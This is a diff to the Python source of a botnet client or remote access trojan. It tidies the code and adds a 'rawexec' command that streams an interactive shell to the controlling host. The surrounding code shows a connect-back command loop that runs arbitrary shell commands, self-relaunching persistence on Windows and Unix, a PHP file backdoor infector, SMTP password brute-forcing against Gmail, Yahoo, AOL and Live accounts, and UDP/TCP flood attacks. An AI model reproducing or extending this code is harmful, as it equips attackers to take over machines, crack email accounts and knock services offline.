@@ -32,7 +32,7 @@ import random
 import fnmatch
 import tempfile
 import socket
-from threading import Thread
+import re
 
 if len(sys.argv) == 3:
     host = sys.argv[1]
@@ -56,13 +56,13 @@ def product(*args, **kwds):
     for prod in result:
         yield tuple(prod)
 
-def _repeat(object, times=None):
+def repeat(obj, times=None):
     if times is None:
         while True:
-            yield object
+            yield obj
     else:
         for _ in range(times):
-            yield object
+            yield obj
 
 # Self Update
 temporary = """\
@@ -108,18 +108,35 @@ else: os.system(r"nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &")
 def selfUpdate():
     while 1:
         filename = "%d.py" % random.randint(1, 1000)
-        if not os.path.exists(filename): break
+        if not os.path.exists(filename):
+            break
 
     with open(filename, "w") as f:
         f.write(temporary)
 
     if sys.platform == "win32":
         runner = 'CreateObject("WScript.Shell").Run WScript.Arguments(0), 0'
-        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f: f.write(runner)
+        with open(tempfile.gettempdir() + "/runner.vbs", "w") as f:
+            f.write(runner)
         os.system(tempfile.gettempdir() + '/runner.vbs "{exe} {arg} {host} {port}"'
                   .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
-    else: os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
-                    .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+    else:
+        os.system("nohup {exe} {arg} {host} {port} > /dev/null 2>&1 &"
+                  .format(host=host, port=port, exe=sys.executable, arg=sys.argv[0]))
+
+def send_msg(sock, proc, sem):
+    while True:
+        if sem.acquire(False):
+            return
+        sock.send(proc.stdout.read(1))
+
+def recv_msg(sock, proc, sem):
+    while True:
+        if sem.acquire(False):
+            return
+        data = sock.recv(20480)
+        if len(data) > 0:
+            proc.stdin.write(data)
 
 # PHP Infector
 backdoor = """
@@ -422,12 +439,12 @@ def rmbackdoor(thedir):
     allphp = find_files(thedir, '*.php')
 
     for thefile in allphp:
-        if ((os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK))):
+        if (os.access(thefile, os.R_OK)) and (os.access(thefile, os.W_OK)):
             f = open(thefile, "r")
             inside = f.read()
             f.close()
 
-            if ("#WARNING: Clean base64id: 55a1983" in inside):
+            if "#WARNING: Clean base64id: 55a1983" in inside:
                 inside = inside.replace(backdoor, "")
                 f = open(thefile, "w")
                 f.write(inside)
@@ -446,10 +463,11 @@ def gmailbruteforce(email, combination, minimum, maximum):
     found = False
 
     for n in range(minimum, maximum+1):
-        if (found == False):
+        if not found:
             for w in product(combination, repeat=n):
                 password = ''.join(w)
-                try: smtpserver.login(email, password)
+                try:
+                    smtpserver.login(email, password)
                 except(smtplib.SMTPAuthenticationError) as msg:
                     if "Please Log" in str(msg):
                         savePass(password)
@@ -460,24 +478,27 @@ def gmailbruteforce(email, combination, minimum, maximum):
 
 def popularbruteforce(cmd):
     bruteinfo = cmd[1].split(":")
-    if cmd[0] == "yahoobruteforce": server = "smtp.mail.yahoo.com"
-    elif cmd[0] == "livebruteforce": server = "stmp.aol.com"
-    elif cmd[0] == "aolbruteforce": server = "smtp.live.com"
-    t = Thread(None, custombruteforce, None, (server, 587, bruteinfo[0], bruteinfo[1],
-                                              bruteinfo[2], bruteinfo[3]))
+    if cmd[0] == "yahoobruteforce":
+        server = "smtp.mail.yahoo.com"
+    elif cmd[0] == "livebruteforce":
+        server = "stmp.aol.com"
+    elif cmd[0] == "aolbruteforce":
+        server = "smtp.live.com"
+    t = threading.Thread(None, custombruteforce, None, (server, 587, bruteinfo[0], bruteinfo[1],
+                                                        bruteinfo[2], bruteinfo[3]))
     t.start()
 
-def custombruteforce(address, port, email, combination, minimum, maximum):
-    smtpserver = smtplib.SMTP(address, int(port))
+def custombruteforce(address, smtpport, email, combination, minimum, maximum):
+    smtpserver = smtplib.SMTP(address, int(smtpport))
     smtpserver.starttls()
     smtpserver.ehlo()
 
     found = False
 
     for n in range(minimum, maximum+1):
-        if found == False:
+        if not found:
             for w in product(combination, repeat=n):
-                word = ''.join(w)
+                password = ''.join(w)
                 try:
                     smtpserver.login(email, password)
                     savePass(password)
@@ -497,7 +518,6 @@ class udpFlood(threading.Thread):
     def run(self):
         timeout = time.time() + 60
         while True:
-            test = 0
             if time.time() <= timeout:
                 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 s.connect((self.victimip, int(self.victimport)))
@@ -515,7 +535,6 @@ class tcpFlood(threading.Thread):
     def run(self):
         timeout = time.time() + 60
         while True:
-            test = 0
             if time.time() <= timeout:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(1)
@@ -527,7 +546,7 @@ class tcpFlood(threading.Thread):
 
 def udpUnleach(victimip, victimport):
     threads = []
-    for i in range(1, 21):
+    for _ in range(1, 21):
         thread = udpFlood(victimip, victimport)
         thread.start()
         threads.append(thread)
@@ -537,7 +556,7 @@ def udpUnleach(victimip, victimport):
 
 def tcpUnleach(victimip, victimport):
     threads = []
-    for i in range(1, 21):
+    for _ in range(1, 21):
         thread = tcpFlood(victimip, victimport)
         thread.start()
         threads.append(thread)
@@ -549,7 +568,7 @@ def main(host, port):
     while 1:
         connected = False
         while 1:
-            while connected == False:
+            while not connected:
                 try:
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     s.connect((host, port))
@@ -561,9 +580,10 @@ def main(host, port):
             try:
                 msg = s.recv(20480).decode()
                 print(msg)
-                allofem = msg.split(";")
+                allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
                 for onebyone in allofem:
                     commands = onebyone.split()
+                    if len(commands)==0: continue
                     if commands[0] == "cd":
                         try:
                             os.chdir(commands[1])
@@ -594,8 +614,8 @@ def main(host, port):
                     elif commands[0] == "udpflood":
                         try:
                             udpinfo = commands[1].split(":")
-                            t = Thread(None, udpUnleach, None, (udpinfo[0],
-                                                                udpinfo[1]))
+                            t = threading.Thread(None, udpUnleach, None,
+                                                 (udpinfo[0], udpinfo[1]))
                             t.start()
                             s.send(bytes("[CLIENT] Flooding started\n",
                                          'utf-8'))
@@ -603,46 +623,46 @@ def main(host, port):
                             s.send(bytes("[CLIENT] Failed to start Flooding\n",
                                          'utf-8'))
                             pass
-                    elif (commands[0] == "udpfloodall"):
+                    elif commands[0] == "udpfloodall":
                         try:
                             udpinfo = commands[1].split(":")
-                            t = Thread(None,udpUnleach,None,(udpinfo[0],
-                                                             udpinfo[1]))
+                            t = threading.Thread(None, udpUnleach, None, (udpinfo[0],
+                                                                          udpinfo[1]))
                             t.start()
                         except:
                             pass
-                    elif (commands[0] == "tcpflood"):
+                    elif commands[0] == "tcpflood":
                         try:
                             tcpinfo = commands[1].split(":")
-                            t = Thread(None,tcpUnleach,None,(tcpinfo[0],
-                                                             tcpinfo[1]))
+                            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
+                                                                          tcpinfo[1]))
                             t.start()
                             s.send(bytes("[INFO] Flooding started\n",
                                          'utf-8'))
                         except:
                             s.send(bytes("[ERROR] Failed to start Flooding\n",
                                          'utf-8'))
-                            pass
-                    elif (commands[0] == "tcpfloodall"):
+                    elif commands[0] == "tcpfloodall":
                         try:
                             tcpinfo = commands[1].split(":")
-                            t = Thread(None,tcpUnleach,None,(tcpinfo[0],
-                                                             tcpinfo[1]))
+                            t = threading.Thread(None, tcpUnleach, None, (tcpinfo[0],
+                                                                          tcpinfo[1]))
                             t.start()
                         except:
                             pass
-                    elif (commands[0] == "gmailbruteforce"):
+                    elif commands[0] == "gmailbruteforce":
                         try:
                             bruteinfo = commands[1].split(":")
-                            t = Thread(None,gmailbruteforce,None(bruteinfo[0],
-                                    bruteinfo[1], bruteinfo[2], bruteinfo[3]))
+                            t = threading.Thread(None, gmailbruteforce, None,
+                                                 (bruteinfo[0], bruteinfo[1],
+                                                  bruteinfo[2], bruteinfo[3]))
                             t.start()
                             s.send(bytes("[CLIENT] Bruteforcing started\n",
                                          'utf-8'))
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]):
+                    elif commands[0] in ["yahoobruteforce", "livebruteforce", "aolbruteforce"]:
                         try:
                             popularbruteforce(commands)
                             s.send(bytes("[CLIENT] Bruteforcing started\n",
@@ -650,36 +670,59 @@ def main(host, port):
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] == "custombruteforce"):
+                    elif commands[0] == "custombruteforce":
                         try:
                             bruteinfo = commands[1].split(":")
-                            t = Thread(None,custombruteforce,None,
-                                       (bruteinfo[0], bruteinfo[1],
-                                        bruteinfo[2], bruteinfo[3],
-                                        bruteinfo[4], bruteinfo[5]))
+                            t = threading.Thread(None, custombruteforce, None,
+                                                 (bruteinfo[0], bruteinfo[1],
+                                                  bruteinfo[2], bruteinfo[3],
+                                                  bruteinfo[4], bruteinfo[5]))
                             t.start()
                             s.send(bytes("[CLIENT] Bruteforcing started\n",
                                          'utf-8'))
                         except:
                             s.send(bytes("[CLIENT] Wrong arguments\n",
                                          'utf-8'))
-                    elif (commands[0] == "hellows123"):
+                    elif commands[0] == "hellows123":
                         s.send(bytes(os.getcwd(), 'utf-8'))
-                    elif (commands[0] == "quit"):
+                    elif commands[0] == "quit":
                         s.close()
                         print("[INFO] Connection Closed")
                         break
+                    elif commands[0] == "rawexec":
+                        print("[INFO] Spawning {}".format(commands[1]))
+                        sem1 = threading.Semaphore()
+                        sem2 = threading.Semaphore()
+                        sem1.acquire(False)
+                        sem2.acquire(False)
+                        p = subprocess.Popen(' '.join(commands[1:]), shell=True,
+                                             stdout=subprocess.PIPE,
+                                             stderr=subprocess.STDOUT,
+                                             stdin=subprocess.PIPE)
+                        sender = threading.Thread(target=send_msg, args=(s, p, sem1,))
+                        recver = threading.Thread(target=recv_msg, args=(s, p, sem2,))
+                        sender.daemon = True
+                        recver.daemon = True
+                        sender.start()
+                        recver.start()
+                        p.wait()
+                        sem1.release()
+                        sem2.release()
+                        while threading.active_count() > 1:
+                            pass
+                        s.send(bytes('stop', 'utf-8'))
                     else:
                         thecommand = ' '.join(commands)
                         pipe = subprocess.PIPE
                         comm = subprocess.Popen(thecommand, shell=True,
-                                        stdout=pipe, stderr=pipe, stdin=pipe)
+                                                stdout=pipe, stderr=pipe,
+                                                stdin=pipe)
                         try:
                             STDOUT, STDERR = comm.communicate(timeout=30)
                             en_STDERR = STDERR.decode()
                             en_STDOUT = STDOUT.decode()
-                            if (en_STDERR == ""):
-                                if (en_STDOUT != ""):
+                            if en_STDERR == "":
+                                if en_STDOUT != "":
                                     print(en_STDOUT)
                                     s.send(bytes(en_STDOUT, 'utf-8'))
                                 else:
